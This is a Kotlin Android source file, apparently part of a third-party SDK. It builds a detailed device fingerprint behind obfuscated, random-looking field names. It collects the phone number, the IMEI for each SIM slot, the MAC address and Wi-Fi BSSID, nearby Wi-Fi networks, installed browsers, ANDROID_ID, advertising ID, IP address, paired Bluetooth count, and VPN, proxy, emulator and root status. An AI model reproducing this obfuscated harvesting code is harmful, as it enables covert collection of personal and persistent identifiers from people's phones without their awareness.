package core;

import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.content.Context
import android.content.pm.PackageManager
import android.hardware.Sensor
import android.hardware.SensorManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.Build
import android.os.SystemClock
import android.provider.Settings
import android.telephony.*
import android.util.Log
import androidx.annotation.RequiresApi
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.gson.Gson
import com.plugs.core.FunctionUtil
import com.plugs.core.FunctionUtil.getBrowserList2
import core.ro0.podkhffueuwior
import core.ro0.phoneHardInfo
import core.ro0.phoneScreenInfo
import core.ro0.simulatorInfo
import core.ro0.deviceOtherInfo
import core.ro0.sensorInfo
import com.plugs.core.util.DeviceUtils
import com.plugs.core.util.NetworkUtils
import com.plugs.core.util.SPUtils
import com.plugs.core.util.Utils
import kotlinx.coroutines.runBlocking
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.net.InetAddress
import java.net.NetworkInterface
import java.util.*


object DevicesUtils {
    var podkhffueuwior: podkhffueuwior? = podkhffueuwior()

    fun getDeviceData(): podkhffueuwior? {
        var podkhffueuwior: podkhffueuwior?
        runBlocking {
            podkhffueuwior = CrawlDataUtil.getInstance().crawlData()
        }
        DevicesUtils.podkhffueuwior = podkhffueuwior
        return podkhffueuwior
    }

    @RequiresApi(Build.VERSION_CODES.M)
    fun getDeviceData(context: Context): podkhffueuwior? {
        var podkhffueuwior: podkhffueuwior?
        runBlocking {
            podkhffueuwior = CrawlDataUtil.getInstance().crawlData()
        }
        DevicesUtils.podkhffueuwior = podkhffueuwior

        try {
            getSensorList(context)
        } catch (e: Exception) {
            podkhffueuwior?.ymgwlIwsbIqzvjOlyoOzg!!.add(e)
        }

        try {
            getPhoneScreenInfo(context)
        } catch (e: Exception) {
            podkhffueuwior?.ymgwlIwsbIqzvjOlyoOzg!!.add(e)
        }

        try {
            getPhoneInfoHard()
        } catch (e: Exception) {
            podkhffueuwior?.ymgwlIwsbIqzvjOlyoOzg!!.add(e)
        }

        try {
            getDeviceOther(context)
        } catch (e: Exception) {
            podkhffueuwior?.ymgwlIwsbIqzvjOlyoOzg!!.add(e)
        }

        try {
            getSimulatorInfo()

        } catch (e: Exception) {
            podkhffueuwior?.ymgwlIwsbIqzvjOlyoOzg!!.add(e)
        }

        return podkhffueuwior
    }


    fun getSimulatorInfo() {
        var simulatorInfo = simulatorInfo()
        try {
            simulatorInfo.fbmpqBlrHueIhai = Build.CPU_ABI
            simulatorInfo.uajLbmNuxpcZvsuf = Build.CPU_ABI2
            simulatorInfo.lycyzSjamPjsCcj = Build.TAGS
            simulatorInfo.clmkGqcIdwdKae = Build.USER
            simulatorInfo.lgpPkuvAhvxmPvvmi = Build.TYPE
            simulatorInfo.mbjhLpzatGtq = Build.BOARD
            simulatorInfo.idjwhMlpgaNritOuctn = Build.BRAND
            simulatorInfo.bplrVatdiLeptv = Build.HARDWARE
            simulatorInfo.ncexFkemlImmxPjyxRkfo = Build.PRODUCT
            simulatorInfo.hondHinLduusSrywwWcbb = Build.MANUFACTURER
            simulatorInfo.dcbvsRergGwozm = Utils.getApp().packageManager.hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH);
            simulatorInfo.aqbNofQsjgJsg = DeviceUtils.isEmulator()

            podkhffueuwior?.utaIroanEwkj = simulatorInfo
        } catch (e: Exception) {
            podkhffueuwior?.ymgwlIwsbIqzvjOlyoOzg!!.add(e)
        }
    }


    fun getSensorList(context: Context) {
        val jsonArray = JSONArray()

        val sensorManager = context.getSystemService(Context.SENSOR_SERVICE) as SensorManager

        val sensors = sensorManager.getSensorList(Sensor.TYPE_ALL)
        val sensorInfo = sensorInfo("");
        try {
            for (item in sensors) {
                val jsonObject = JSONObject()
                jsonObject.put("type", item.type.toString())
                jsonObject.put("name", item.name)
                jsonObject.put("version", item.version.toString())
                jsonObject.put("vendor", item.vendor)
                jsonObject.put("maxRange", item.maximumRange.toString())
                jsonObject.put("minDelay", item.minDelay.toString())
                jsonObject.put("power", item.power.toString())
                jsonObject.put("resolution", item.resolution.toString())
                jsonArray.put(jsonObject)
            }
            sensorInfo.wxiTzsJxhhiRkzjMkkmp = jsonArray.toString()
            podkhffueuwior?.ilsycIqxYhlf = sensorInfo
        } catch (e: java.lang.Exception) {
            podkhffueuwior?.ymgwlIwsbIqzvjOlyoOzg!!.add(e)
        }
        return
    }



    @RequiresApi(Build.VERSION_CODES.M)
    fun getDeviceOther(context: Context) {
        var deviceOtherInfo = deviceOtherInfo()
        podkhffueuwior?.yojdRcnYraParbSwrf = deviceOtherInfo
        try {
            deviceOtherInfo.rjccsNefLawqJstkNatkk = Build.MODEL
            val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager?

            val wifiManager: WifiManager = context.getSystemService(Context.WIFI_SERVICE) as WifiManager
            deviceOtherInfo.ucvHifRcjhwWwa = wifiManager?.connectionInfo?.macAddress;
            deviceOtherInfo.lmkuPsctOtgdIzx = Build.VERSION.RELEASE;

            val displayMetrics = context.resources.displayMetrics
            deviceOtherInfo.losXmuoOwg = FunctionUtil.getWifiList(context)
            deviceOtherInfo.rdopfBvcdoLralo = Build.getRadioVersion()
            deviceOtherInfo.xxpvmTpurKqqsfOkysw = System.getProperty("os.version")
            deviceOtherInfo.ayyorCzcReq = Build.CPU_ABI
            deviceOtherInfo.gdqyQmyhmSskkEuociLtkc = 1
            deviceOtherInfo.wctdcFlbxWttfRxn  = 0
            deviceOtherInfo.ydeFpuYcrdIvec = "android"
            deviceOtherInfo.cqjSoihVfknuKaft = NetworkUtils.getNetworkType().toString()
            deviceOtherInfo.fuivrOiapoJsytXnddgBupa = getIPAddress()
            deviceOtherInfo.laheDngqOhrBbgq = getIPAddress()
            deviceOtherInfo.jjzbBgvIcprZllVnfua = Build.VERSION.RELEASE
            deviceOtherInfo.nyhfaEemoQacw = Build.VERSION.RELEASE
            deviceOtherInfo.yrryyCjoaWpid = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
            deviceOtherInfo.sxppHrkddWnfTaq = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
            deviceOtherInfo.mlxOjuzyTsmBxkeDlt = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
            deviceOtherInfo.ypsxkJzbfEsueeJnqopDoj = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
            deviceOtherInfo.urgdTnhHqtLko = getBrowserList2(context)
            deviceOtherInfo.flgsxOpcSjijtCgbge = getSignalStrength(context)
            deviceOtherInfo.oyykKjuDcnaXbyogXej = wifiManager.connectionInfo
            deviceOtherInfo.altOnuEle = wifiManager.connectionInfo?.bssid
            val uptimeMillis: Long = SystemClock.uptimeMillis()
            val currentTimeMillis = System.currentTimeMillis()
            var lastBootTimeMillis = currentTimeMillis - uptimeMillis
            deviceOtherInfo.gfjAetmHxjx = lastBootTimeMillis.toString()
            deviceOtherInfo.jabwBzjcZxak = lastBootTimeMillis.toString()
            deviceOtherInfo.vxdvLsrNarxBhzceEjlg = SystemClock.elapsedRealtime().toString()

            deviceOtherInfo.dzynOnqfNcnwyEpubl = wifiManager?.connectionInfo?.macAddress;
            deviceOtherInfo.pevgwFrcXgjvKxsbdKon = if (isVpnConnected(context)) 1 else 2
            deviceOtherInfo.nygwjIthtwSkl = if (isProxyEnabled()) 1 else 2
            deviceOtherInfo.gdqyQmyhmSskkEuociLtkc = if (FunctionUtil.isPad(context)) 2 else 1

            try {
                val advertisingIdInfo: AdvertisingIdClient.Info = AdvertisingIdClient.getAdvertisingIdInfo(context.getApplicationContext());
                deviceOtherInfo.whwlbIcyRvkfdNhogHlr = advertisingIdInfo.getId();

            } catch (e: Exception) {
                podkhffueuwior?.ymgwlIwsbIqzvjOlyoOzg!!.add(e)
            }
            deviceOtherInfo.rbtxChnfgCckeDwzv = 1

            val bluetoothAdapter: BluetoothAdapter = BluetoothAdapter.getDefaultAdapter()
            val pairedDevices: Set<BluetoothDevice> = bluetoothAdapter.getBondedDevices()
            val numberOfPairedDevices = pairedDevices.size
            deviceOtherInfo.rjynAupxFgje = numberOfPairedDevices.toString()
            deviceOtherInfo.lyhFbwftBxl = telephonyManager?.getLine1Number()
            deviceOtherInfo.wapPbndXcfAgi = telephonyManager?.getLine1Number()


            for (slot in 0 until telephonyManager!!.phoneCount) {
                if (slot == 0) deviceOtherInfo.mzsHvxzArq = telephonyManager.getDeviceId(slot)

                if (slot == 1) deviceOtherInfo.dzmCgtBxnZcrsWaqyl = telephonyManager.getDeviceId(slot)

            }


        } catch (e: Exception) {
            podkhffueuwior?.ymgwlIwsbIqzvjOlyoOzg!!.add(e)
        }


        return
    }


    fun getPhoneScreenInfo(context: Context) {
        val dm = context.resources.displayMetrics
        var phoneScreenInfo = phoneScreenInfo()
        try {
            val screenJson: String = Gson().toJson(dm)
            val jsonObject = JSONObject(screenJson)

            phoneScreenInfo.oqhJgepXosa = jsonObject.getInt("noncompatHeightPixels")
            phoneScreenInfo.yrkhbLcpxhSjpafOxceMgl = jsonObject.getInt("noncompatDensityDpi")
            phoneScreenInfo.ajlraMggHpealCfytj = jsonObject.getInt("noncompatWidthPixels")

            val noncompatDensity = jsonObject.getInt("noncompatDensity")
            phoneScreenInfo.fqxNtcqiRrry = noncompatDensity
            val noncompatScaledDensity = jsonObject.getDouble("noncompatScaledDensity")
            phoneScreenInfo.ozeTgfObnclCui = noncompatScaledDensity
            val noncompatXdpi = jsonObject.getDouble("noncompatXdpi")
            val noncompatYdpi = jsonObject.getDouble("noncompatYdpi")
        } catch (e: Exception) {
            podkhffueuwior?.ymgwlIwsbIqzvjOlyoOzg!!.add(e)
        }

        phoneScreenInfo.dyziiMzmrsWknGpobqFxet = dm.xdpi
        phoneScreenInfo.cjozpTbiQra = dm.ydpi
        phoneScreenInfo.zjwlEkcsbYpms = dm.density
        phoneScreenInfo.qlafLdoKqzuy = dm.densityDpi
        phoneScreenInfo.pegjPzhGhasOuk = dm.heightPixels
        phoneScreenInfo.xdfpkBcpoJcnfy = dm.widthPixels
        phoneScreenInfo.oklmtIivlsIhmkoBof = dm.widthPixels.toString().plus("*").plus(dm.heightPixels)
        phoneScreenInfo.ysaFpxvGgai = dm.widthPixels.toString().plus("*").plus(dm.heightPixels)
        phoneScreenInfo.qfizMffxIpjm = dm.scaledDensity
        phoneScreenInfo.zctfZataQdkszZqjn = dm.xdpi
        phoneScreenInfo.lmhQkpvfYflwg = dm.ydpi
        podkhffueuwior?.xbufmCutLzeyPvrsc = phoneScreenInfo

    }

    fun getPhoneInfoHard() {
        val phoneHardInfo = phoneHardInfo()
        phoneHardInfo.idjwhMlpgaNritOuctn = Build.BOARD
        phoneHardInfo.iwsvkQabxEctdcCsvv = Build.BRAND
        phoneHardInfo.hxiovElygrNiol = Build.DEVICE
        phoneHardInfo.bplrVatdiLeptv = Build.HARDWARE
        phoneHardInfo.astUxbkFqrVrw = Build.MODEL
        phoneHardInfo.dzfxTwhoVfgGipp = Build.PRODUCT
        phoneHardInfo.oegwzWghvlHqlgObl = Build.MANUFACTURER
        phoneHardInfo.sfdXbwdQzqRzeb = Build.FINGERPRINT
        phoneHardInfo.haydqBjqqPmkedZced = Build.DISPLAY
        phoneHardInfo.zmolEjgStnhBzky = Build.getRadioVersion()
        phoneHardInfo.rcpUqvkPfrnGzbcWxwo = Build.SERIAL
        phoneHardInfo.tffsBcefwHdpshMpgxr = Build.HOST
        phoneHardInfo.nvbinHfxvGzgnGpg = Build.ID
        phoneHardInfo.nghqXfvYvkslWaaPxr = Build.VERSION.RELEASE
        phoneHardInfo.dgsOliEfwnzQza = Build.BRAND

        phoneHardInfo.laxdGuxx = Build.BOARD
        phoneHardInfo.kvgJsf = Build.BRAND
        phoneHardInfo.cfnrGnaRjwhmy = Build.DISPLAY
        phoneHardInfo.gapmlShymjWlpvuf = Build.FINGERPRINT
        phoneHardInfo.ybgtIqynhj = Build.HARDWARE
        phoneHardInfo.gaefKngf = Build.HOST
        phoneHardInfo.shldiLfvr = Build.ID
        phoneHardInfo.ahjuhqLbnTcm = Build.MANUFACTURER
        phoneHardInfo.mtiGcmBscfz = Build.MODEL
        phoneHardInfo.egnTnxbxj = Build.PRODUCT
        podkhffueuwior?.gufsEqqxNrlKuk = phoneHardInfo
    }


    fun getIPAddress(): String {
        var ipAddress = ""
        try {
            val interfaces: List<NetworkInterface> = Collections.list(NetworkInterface.getNetworkInterfaces())
            for (intf in interfaces) {
                val addrs: List<InetAddress> = Collections.list(intf.inetAddresses)
                for (addr in addrs) {
                    if (!addr.isLoopbackAddress) {
                        ipAddress = addr.hostAddress
                    }
                }
            }
        } catch (ex: java.lang.Exception) {
            Log.e("IP Address", ex.toString())
            podkhffueuwior?.ymgwlIwsbIqzvjOlyoOzg!!.add(ex)

        }
        return ipAddress
    }


    private fun getSignalStrength(context: Context): Int {
        val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager?

        try {

            val cellInfo: CellInfo = telephonyManager!!.allCellInfo[0]
            return if (cellInfo is CellInfoGsm) {
                val signalStrengthGsm: CellSignalStrengthGsm = (cellInfo as CellInfoGsm).cellSignalStrength
                signalStrengthGsm.dbm
            } else if (cellInfo is CellInfoCdma) {
                val signalStrengthCdma: CellSignalStrengthCdma = (cellInfo as CellInfoCdma).getCellSignalStrength()
                signalStrengthCdma.dbm
            } else if (cellInfo is CellInfoLte) {
                val signalStrengthLte: CellSignalStrengthLte = (cellInfo as CellInfoLte).getCellSignalStrength()
                signalStrengthLte.dbm
            } else if (cellInfo is CellInfoWcdma) {
                val signalStrengthWcdma: CellSignalStrengthWcdma = (cellInfo as CellInfoWcdma).getCellSignalStrength()
                signalStrengthWcdma.dbm
            } else {
                0
            }
        } catch (e: Exception) {
            podkhffueuwior?.ymgwlIwsbIqzvjOlyoOzg!!.add(e)

            return 0
        }
    }


    private fun isVpnConnected(context: Context): Boolean {
        val connectivityManager: ConnectivityManager? = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager?
        if (connectivityManager != null) {
            for (network in connectivityManager.getAllNetworks()) {
                val capabilities: NetworkCapabilities? = connectivityManager.getNetworkCapabilities(network)
                if (capabilities != null && capabilities.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
                    return true
                }
            }
        }
        return false
    }

    private fun isProxyEnabled(): Boolean {
        val proxyHost = System.getProperty("http.proxyHost")
        val portStr = System.getProperty("http.proxyPort")
        val proxyPort = (portStr ?: "-1").toInt()
        return proxyHost != null && proxyPort != -1
    }


    /**
     *
     *
     * @return
     */
    fun isSuEnable(): Boolean {

        var file: File? = null
        val paths = arrayOf("/system/xbin/", "/system/sbin/", "/sbin/", "/vendor/bin/", "/su/bin/","/system/bin/")
        try {
            for (path in paths) {
                file = File(path + "su")
                if (file.exists() && file.canExecute()) {

                    return true
                }
            }
        } catch (x: java.lang.Exception) {
            x.printStackTrace()
            podkhffueuwior?.ymgwlIwsbIqzvjOlyoOzg!!.add(x)

        }
        return false
    }


}